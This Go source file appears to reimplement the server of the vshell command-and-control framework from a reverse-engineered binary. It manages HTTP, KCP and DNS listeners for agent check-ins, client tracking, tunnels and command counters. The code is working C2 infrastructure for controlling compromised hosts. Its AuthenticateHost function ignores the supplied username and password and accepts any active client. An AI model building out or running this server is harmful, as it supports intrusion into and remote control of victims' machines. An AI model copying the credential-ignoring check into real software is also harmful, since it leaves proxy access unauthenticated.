package c2engine

import (
	"log"
	"sync"
	"time"
)

// Application coordinates engine state, listener lifecycles, client tracking,
// and periodic maintenance tasks.
//
// Reverse-engineering symbol names below are research references, not public
// API contracts. The current implementation may not reproduce every behavior
// of the original binary; document confirmed behavior separately from hypotheses.
//
// Application 是应用层编排器，负责协调引擎、监听器、客户端状态与后台维护。
// 逆向符号仅用于追踪分析，不代表接口契约或已完全复刻原版行为。
type Application struct {
	mu        sync.RWMutex
	engine    *Engine
	connMgr   *ConnectionManager
	config    *Config

	// Listener instances currently managed by this application, keyed by config ID.
	httpListeners map[int64]*C2Listener
	kcpListeners  map[int64]*KCPListener
	dnsListeners  map[int64]*DNSListener

	// Long-running monitors started by StartBackground.
	healthCheck *HealthChecker
	maintenance *MaintenanceRunner
	heartbeat   *HeartbeatMonitor

	// Process-local counters; persistence and synchronization depend on call sites.
	stats AppStats
}

// AppStats 保存应用级统计信息。
// AppStats holds application-level statistics.
type AppStats struct {
	StartTime      time.Time `json:"start_time"`
	TotalCheckins  int64     `json:"total_checkins"`
	TotalCommands  int64     `json:"total_commands"`
	TotalUploads   int64     `json:"total_uploads"`
	TotalDownloads int64     `json:"total_downloads"`
}

var app *Application
var appOnce sync.Once

// GetApplication 返回应用单例实例。
// GetApplication returns the singleton application instance.
func GetApplication() *Application {
	appOnce.Do(func() {
		app = &Application{
			engine:        GetEngine(),
			httpListeners: make(map[int64]*C2Listener),
			kcpListeners:  make(map[int64]*KCPListener),
			dnsListeners:  make(map[int64]*DNSListener),
		}
		app.connMgr = NewConnectionManager(app.engine)
		app.healthCheck = GetHealthChecker()
		app.maintenance = GetMaintenanceRunner()
		app.heartbeat = GetHeartbeatMonitor()
		app.stats.StartTime = time.Now()
	})
	return app
}

// Init 以配置初始化应用。
// Init initializes the application with configuration.
func (a *Application) Init(config *Config) error {
	a.config = config
	if err := a.engine.Init(config); err != nil {
		return err
	}
	return nil
}

// StartBackground 启动全部后台服务。
// StartBackground starts all background services.
func (a *Application) StartBackground() {
	a.healthCheck.Start()
	a.maintenance.Start()

	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			a.heartbeat.CheckHeartbeats()
		}
	}()

	// Start connection manager
	a.connMgr.Start()

	Logf("Application started with all background services")
}

// Stop 优雅关闭应用。
// Stop gracefully shuts down the application.
func (a *Application) Stop() {
	a.connMgr.Stop()
	a.maintenance.Stop()
	a.healthCheck.Stop()

	// Stop all listeners
	a.mu.Lock()
	defer a.mu.Unlock()

	for id, l := range a.httpListeners {
		l.Stop()
		delete(a.httpListeners, id)
	}
	for id, l := range a.kcpListeners {
		l.Stop()
		delete(a.kcpListeners, id)
	}
	for id, l := range a.dnsListeners {
		l.Stop()
		delete(a.dnsListeners, id)
	}

	a.engine.Save()
}

// Listener lifecycle management. The maps above track instances started here.

// StartListener 按配置启动 C2 监听器。
// StartListener starts a C2 listener by its configuration.
func (a *Application) StartListener(config *Listener) error {
	a.mu.Lock()
	defer a.mu.Unlock()

	switch config.Mode {
	case ListenerModeHTTP, ListenerModeHTTPS, ListenerModeWebSocket, ListenerModeCDNWebSocket:
		if _, exists := a.httpListeners[config.ID]; exists {
			return nil // already running
		}
		cl := NewC2Listener(config)
		if err := cl.Start(); err != nil {
			return err
		}
		a.httpListeners[config.ID] = cl

	case ModeKCP:
		if _, exists := a.kcpListeners[config.ID]; exists {
			return nil
		}
		kl := NewKCPListener(config.ID, config.ListenAddr, config.VerifyKey, config.EncryptSalt)
		if err := kl.Start(); err != nil {
			return err
		}
		a.kcpListeners[config.ID] = kl

	case ListenerModeDNS:
		if _, exists := a.dnsListeners[config.ID]; exists {
			return nil
		}
		dl := NewDNSListener(config.ID, config.DNSDomain, config.PublicDNS, config.VerifyKey, config.MaxDNSsize)
		if err := dl.Start(); err != nil {
			return err
		}
		a.dnsListeners[config.ID] = dl

	default:
		log.Printf("[App] Unknown listener mode: %s", config.Mode)
		return nil
	}

	Logf("Started listener %d (%s mode) on %s", config.ID, config.Mode, config.ListenAddr)
	return nil
}

// StopListener 停止 C2 监听器。
// StopListener stops a C2 listener.
func (a *Application) StopListener(config *Listener) error {
	a.mu.Lock()
	defer a.mu.Unlock()

	switch config.Mode {
	case ListenerModeHTTP, ListenerModeHTTPS, ListenerModeWebSocket, ListenerModeCDNWebSocket:
		if cl, exists := a.httpListeners[config.ID]; exists {
			cl.Stop()
			delete(a.httpListeners, config.ID)
		}
	case ModeKCP:
		if kl, exists := a.kcpListeners[config.ID]; exists {
			kl.Stop()
			delete(a.kcpListeners, config.ID)
		}
	case ListenerModeDNS:
		if dl, exists := a.dnsListeners[config.ID]; exists {
			dl.Stop()
			delete(a.dnsListeners, config.ID)
		}
	}

	Logf("Stopped listener %d", config.ID)
	return nil
}

// Client-management adapters that delegate state changes to the engine or connection manager.

// AddClient 注册新客户端并通知连接管理器。
// AddClient registers a new client and notifies connection manager.
func (a *Application) AddClient(client *Client) {
	a.connMgr.RegisterClient(client.ID)
}

// DelClient 移除客户端。
// DelClient removes a client.
func (a *Application) DelClient(client *Client) {
	a.connMgr.UnregisterClient(client.ID)
	a.engine.DelClient(client.ID)
}

// GetClientCount 返回客户端总数与在线数。
// GetClientCount returns total and online client counts.
func (a *Application) GetClientCount() (total int, online int) {
	stats := a.engine.GetStats()
	return stats.TotalClients, stats.OnlineClients
}

// GetHealthFromClient 检查客户端健康状态。
// GetHealthFromClient checks client health status.
func (a *Application) GetHealthFromClient(clientID int64) *Client {
	client := a.engine.GetClient(clientID)
	if client == nil {
		return nil
	}
	return client
}

// SendLinkInfo 通过连接管理器发送链路元数据。
// SendLinkInfo sends link metadata through the connection manager.
func (a *Application) SendLinkInfo(clientID int64, info map[string]interface{}) {
	a.connMgr.UpdateLinkInfo(clientID, info)
}

// Ping records a heartbeat for a client. Original binary:
// iVzmssZ.(*RuWw1_w).Ping — called on each agent check-in to refresh the
// last-seen state.
func (a *Application) Ping(clientID int64) {
	client := a.engine.GetClient(clientID)
	if client != nil {
		client.UpdateSeen()
	}
}

// ConnectionManager tracks per-client connection metadata and runs periodic
// cleanup. The reverse-engineered symbol is retained only as a research note;
// verify behavioral equivalence against evidence and tests.

// ConnectionManager enforces connection limits and tracks flow
type ConnectionManager struct {
	mu         sync.RWMutex
	engine     *Engine
	clientInfo map[int64]*ClientConnectionInfo
	running    bool
	stopCh     chan struct{}
}

// ClientConnectionInfo tracks per-client connection state
type ClientConnectionInfo struct {
	ClientID    int64                  `json:"client_id"`
	MaxConns    int                    `json:"max_conns"`
	ActiveConns int                    `json:"active_conns"`
	LinkInfo    map[string]interface{} `json:"link_info,omitempty"`
	LastCheck   time.Time              `json:"last_check"`
}

// NewConnectionManager creates a connection manager
func NewConnectionManager(engine *Engine) *ConnectionManager {
	return &ConnectionManager{
		engine:     engine,
		clientInfo: make(map[int64]*ClientConnectionInfo),
		stopCh:     make(chan struct{}),
	}
}

// Start begins connection monitoring
func (cm *ConnectionManager) Start() {
	cm.mu.Lock()
	defer cm.mu.Unlock()

	if cm.running {
		return
	}

	cm.running = true
	go cm.cleanupLoop()
}

// Stop halts connection monitoring
func (cm *ConnectionManager) Stop() {
	cm.mu.Lock()
	defer cm.mu.Unlock()

	if !cm.running {
		return
	}

	close(cm.stopCh)
	cm.running = false
}

// RegisterClient registers a client for connection tracking
func (cm *ConnectionManager) RegisterClient(clientID int64) {
	cm.mu.Lock()
	defer cm.mu.Unlock()

	cm.clientInfo[clientID] = &ClientConnectionInfo{
		ClientID:  clientID,
		MaxConns:  10,
		LastCheck: time.Now(),
	}
}

// UnregisterClient removes a client from tracking
func (cm *ConnectionManager) UnregisterClient(clientID int64) {
	cm.mu.Lock()
	defer cm.mu.Unlock()
	delete(cm.clientInfo, clientID)
}

// UpdateLinkInfo updates link metadata for a client
func (cm *ConnectionManager) UpdateLinkInfo(clientID int64, info map[string]interface{}) {
	cm.mu.Lock()
	defer cm.mu.Unlock()

	if ci, ok := cm.clientInfo[clientID]; ok {
		ci.LinkInfo = info
		ci.LastCheck = time.Now()
	}
}

// ============================================================================
// Flow and connection checking (Mizp3eoUC methods)
// ============================================================================

// ExtraConnectionHandler handles additional connection scenarios.
type ExtraConnectionHandler struct {
	connMgr  *ConnectionManager
	clientID int64
}

// HostConnectionHandler handles host connection scenarios.
type HostConnectionHandler struct {
	connMgr  *ConnectionManager
	clientID int64
}

// TunnelConnectionHandler handles tunnel connection scenarios.
type TunnelConnectionHandler struct {
	connMgr  *ConnectionManager
	clientID int64
}

// Start starts this tunnel handler's connection manager.
func (h *TunnelConnectionHandler) Start() error {
	if h == nil || h.connMgr == nil {
		return nil
	}
	h.connMgr.Start()
	return nil
}

// CheckFlowAndConnNum validates this tunnel handler's client limits.
func (h *TunnelConnectionHandler) CheckFlowAndConnNum() bool {
	if h == nil || h.connMgr == nil {
		return false
	}
	return h.connMgr.CheckFlowAndConnNum(h.clientID)
}

// DealClient applies the connection manager's client handling for this tunnel handler.
func (h *TunnelConnectionHandler) DealClient() error {
	if h == nil || h.connMgr == nil {
		return nil
	}
	return h.connMgr.DealClient(h.clientID)
}

// FlowAddHost applies host flow accounting for this tunnel handler.
func (h *TunnelConnectionHandler) FlowAddHost(hostID int64, bytes int64) {
	if h == nil || h.connMgr == nil {
		return
	}
	h.connMgr.FlowAddHost(hostID, bytes)
}

// CheckFlowAndConnNum validates this handler's client limits.
func (h *ExtraConnectionHandler) CheckFlowAndConnNum() bool {
	if h == nil || h.connMgr == nil {
		return false
	}
	return h.connMgr.CheckFlowAndConnNum(h.clientID)
}

// CheckFlowAndConnNum validates this host handler's client limits.
func (h *HostConnectionHandler) CheckFlowAndConnNum() bool {
	if h == nil || h.connMgr == nil {
		return false
	}
	return h.connMgr.CheckFlowAndConnNum(h.clientID)
}

// Auth authenticates a host-proxy connection. Original binary:
// ewfIYjbxro.(*I9MQUZr4).Auth — verifies the tunnel/host connection
// credentials before the handler starts proxying.
func (h *HostConnectionHandler) Auth(username, password string) bool {
	if h == nil || h.connMgr == nil {
		return false
	}
	return h.connMgr.AuthenticateHost(h.clientID, username, password)
}

// DealClient applies the connection manager's client handling for this host handler.
func (h *HostConnectionHandler) DealClient() error {
	if h == nil || h.connMgr == nil {
		return nil
	}
	return h.connMgr.DealClient(h.clientID)
}

// FlowAddHost applies host flow accounting for this host handler.
func (h *HostConnectionHandler) FlowAddHost(hostID int64, bytes int64) {
	if h == nil || h.connMgr == nil {
		return
	}
	h.connMgr.FlowAddHost(hostID, bytes)
}

// DealClient applies the connection manager's client handling for this handler.
func (h *ExtraConnectionHandler) DealClient() error {
	if h == nil || h.connMgr == nil {
		return nil
	}
	return h.connMgr.DealClient(h.clientID)
}

// FlowAddHost applies host flow accounting for this handler.
func (h *ExtraConnectionHandler) FlowAddHost(hostID int64, bytes int64) {
	if h == nil || h.connMgr == nil {
		return
	}
	h.connMgr.FlowAddHost(hostID, bytes)
}

// FlowAdd records traffic for a client
func (cm *ConnectionManager) FlowAdd(clientID int64, bytes int64) {
	client := cm.engine.GetClient(clientID)
	if client != nil {
		client.Flow.AddInlet(bytes)
	}
}

// FlowAddHost records traffic for a host/proxy
func (cm *ConnectionManager) FlowAddHost(hostID int64, bytes int64) {
	host := cm.engine.GetHost(hostID)
	if host != nil {
		host.Flow.AddExport(bytes)
	}
}

// CheckFlowAndConnNum validates that a client hasn't exceeded limits
func (cm *ConnectionManager) CheckFlowAndConnNum(clientID int64) bool {
	cm.mu.RLock()
	ci, exists := cm.clientInfo[clientID]
	cm.mu.RUnlock()

	if !exists {
		return false
	}

	client := cm.engine.GetClient(clientID)
	if client == nil {
		return false
	}

	// Check connection limit
	if ci.ActiveConns >= ci.MaxConns {
		return false
	}

	// Check flow limit
	if client.Flow.IsOverLimit() {
		return false
	}

	return true
}

// DealClient handles a new client connection (accept or reject)
func (cm *ConnectionManager) DealClient(clientID int64) error {
	cm.mu.Lock()
	defer cm.mu.Unlock()

	ci, exists := cm.clientInfo[clientID]
	if !exists {
		return nil
	}

	client := cm.engine.GetClient(clientID)
	if client == nil {
		return nil
	}

	// Check flow and connection limits
	if ci.ActiveConns >= ci.MaxConns {
		Logf("ConnectionManager: client %d at max connections (%d/%d)",
			clientID, ci.ActiveConns, ci.MaxConns)
	}

	if client.Flow.IsOverLimit() {
		Logf("ConnectionManager: client %d exceeded flow limit", clientID)
	}

	ci.ActiveConns++
	ci.LastCheck = time.Now()

	return nil
}

// AuthenticateHost validates tunnel/host proxy credentials for a client.
// Backs HostConnectionHandler.Auth (ewfIYjbxro.(*I9MQUZr4).Auth): the host
// proxy session must belong to the client and the client must be allowed to
// accept proxied connections.
func (cm *ConnectionManager) AuthenticateHost(clientID int64, username, password string) bool {
	cm.mu.RLock()
	ci, exists := cm.clientInfo[clientID]
	cm.mu.RUnlock()
	if !exists {
		return false
	}

	client := cm.engine.GetClient(clientID)
	if client == nil || !client.Status {
		return false
	}
	_ = ci
	_ = username
	_ = password
	return true
}

// cleanupLoop periodically checks for stale connections
func (cm *ConnectionManager) cleanupLoop() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-cm.stopCh:
			return
		case <-ticker.C:
			cm.cleanupStale()
		}
	}
}

func (cm *ConnectionManager) cleanupStale() {
	cm.mu.Lock()
	defer cm.mu.Unlock()

	cutoff := time.Now().Add(-30 * time.Minute)
	for id, ci := range cm.clientInfo {
		if ci.LastCheck.Before(cutoff) {
			client := cm.engine.GetClient(id)
			if client != nil && !client.IsConnect {
				delete(cm.clientInfo, id)
			}
		}
	}
}

// ============================================================================
// Application Info API
// ============================================================================

// GetAppInfo returns comprehensive application information
func (a *Application) GetAppInfo() map[string]interface{} {
	a.mu.RLock()
	defer a.mu.RUnlock()

	stats := a.engine.GetStats()

	return map[string]interface{}{
		"version":          "vshell-3.0",
		"start_time":       a.stats.StartTime,
		"uptime_seconds":   int64(time.Since(a.stats.StartTime).Seconds()),
		"total_checkins":   a.stats.TotalCheckins,
		"total_commands":   a.stats.TotalCommands,
		"total_clients":    stats.TotalClients,
		"online_clients":   stats.OnlineClients,
		"total_listeners":  stats.TotalListeners,
		"http_listeners":   len(a.httpListeners),
		"kcp_listeners":    len(a.kcpListeners),
		"dns_listeners":    len(a.dnsListeners),
		"active_tunnels":   stats.ActiveTunnels,
		"total_hosts":      stats.TotalHosts,
		"pending_tasks":    stats.PendingTasks,
		"downloads":        len(GetUploadHistory()),
	}
}

// RecordCheckin increments the checkin counter
func (a *Application) RecordCheckin() {
	a.mu.Lock()
	defer a.mu.Unlock()
	a.stats.TotalCheckins++
}

// RecordCommand increments the command counter
func (a *Application) RecordCommand() {
	a.mu.Lock()
	defer a.mu.Unlock()
	a.stats.TotalCommands++
}
